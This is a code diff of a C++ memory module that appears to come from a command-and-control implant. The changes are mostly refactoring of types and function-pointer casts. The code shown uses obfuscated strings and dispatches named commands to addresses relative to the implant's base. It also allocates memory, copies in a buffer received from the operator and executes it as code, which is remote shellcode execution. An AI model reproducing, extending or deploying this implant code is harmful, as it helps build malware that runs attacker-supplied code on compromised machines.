@@ -5,7 +5,6 @@
 
 namespace Memory {
     namespace Methods {
-
         UINT_PTR GetStackCookie() {
             HEXANE
 
@@ -13,11 +12,10 @@ namespace Memory {
             if (!NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
                 cookie = 0;
             }
-
             return cookie;
         }
 
-        VOID GetProcessHeaps(void* process, const uint32_t access, const uint32_t pid) {
+        VOID GetProcessHeaps(HANDLE process, const uint32_t access, const uint32_t pid) {
             HEXANE
 
             HANDLE snap = { };
@@ -65,7 +63,7 @@ namespace Memory {
         _executable* CreateImageData(uint8_t *data) {
             HEXANE
 
-            _executable *image = R_CAST(_executable*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_executable)));
+            auto *const image = R_CAST(_executable*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_executable)));
 
             image->buffer = data;
             image->dos_head = IMAGE_DOS_HEADER(image->buffer);
@@ -262,10 +260,10 @@ namespace Memory {
     }
 
     namespace Objects {
-        _command GetInternalAddress(const char* id, bool* internal) {
+        UINT_PTR GetInternalAddress(const char* id, bool* internal) {
             HEXANE
 
-            _command address = { };
+            uintptr_t address = { };
             *internal = FALSE;
 
             if (id == OBF("null")) {
@@ -279,7 +277,7 @@ namespace Memory {
 
                 if (cmd_map[i].name == id) {
                    *internal = TRUE;
-                   address = R_CAST(void(*)(_parser*), Ctx->Base.Address + U_PTR(cmd_map[i].address));
+                   address = U_PTR(cmd_map[i].address);
                 }
             }
 
@@ -433,14 +431,18 @@ namespace Memory {
             HEXANE
 
             _command cmd        = { };
+            uintptr_t address   = { };
+
             bool is_internal    = false;
             const auto cmd_id   = Parser::UnpackString(&parser, nullptr);
 
-            if (!(cmd = Memory::Objects::GetInternalAddress(cmd_id, &is_internal)) || !is_internal) {
+            if (!(address = Memory::Objects::GetInternalAddress(cmd_id, &is_internal)) || !is_internal) {
                 return_defer(ntstatus);
             }
 
+            cmd = R_CAST(_command, Ctx->Base.Address + address);
             cmd(&parser);
+
             defer:
         }
 
@@ -448,7 +450,7 @@ namespace Memory {
             HEXANE
 
             void *exec  = { };
-            void (*cmd)(_parser*) = { };
+            _command cmd = { };
             size_t size = parser.Length;
 
             if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
@@ -460,7 +462,7 @@ namespace Memory {
                 return_defer(ntstatus);
             }
 
-            cmd = R_CAST(void(*)(_parser*), exec);
+            cmd = R_CAST(_command, exec);
             cmd(&parser);
 
             x_memset(exec, 0, size);
